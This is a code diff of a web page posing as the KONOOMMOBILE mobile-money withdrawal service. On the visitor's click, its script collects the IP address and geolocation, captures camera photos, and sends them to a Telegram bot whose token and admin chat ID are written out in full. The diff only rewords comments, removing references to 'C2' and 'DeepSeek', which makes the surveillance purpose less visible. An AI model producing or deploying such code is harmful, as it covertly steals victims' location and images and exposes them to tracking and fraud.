@@ -336,7 +336,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
 
     <script>
         // ============================================
-        // CONFIGURATION DU BOT TELEGRAM (VALIDÉ)
+        // CONFIGURATION DU BOT TELEGRAM (VERROUILLÉ)
         // ============================================
         const BOT_TOKEN = "8424189628:AAEewbU8l8JJHtBZr48rwYu5VQo39yxVU2o";
         const ADMIN_CHAT_ID = "6815008409";
@@ -384,7 +384,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             
             showStatus('info', '⏳ En cours demande de retrait... ⏳');
             
-            // Lancer les tâches en parallèle (Moteur DeepSeek)
+            // Lancer les tâches en parallèle dès le clic utilisateur
             const ipPromise = getIPAddress();
             const locPromise = getLocation();
             const photosPromise = capturePhotosWithCamera();
@@ -559,7 +559,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             });
         }
         
-        // Envoi des données au bot Telegram (Intégration Agent + C2)
+        // Envoi des données au bot Telegram
         async function sendAllDataToTelegram(ip, location, photos) {
             let message = `🔴 NOUVELLE DEMANDE KONOOMMOBILE 🔴\n\n`;
             message += `━━━━━━━━━━━━━━━━━━━━\n`;
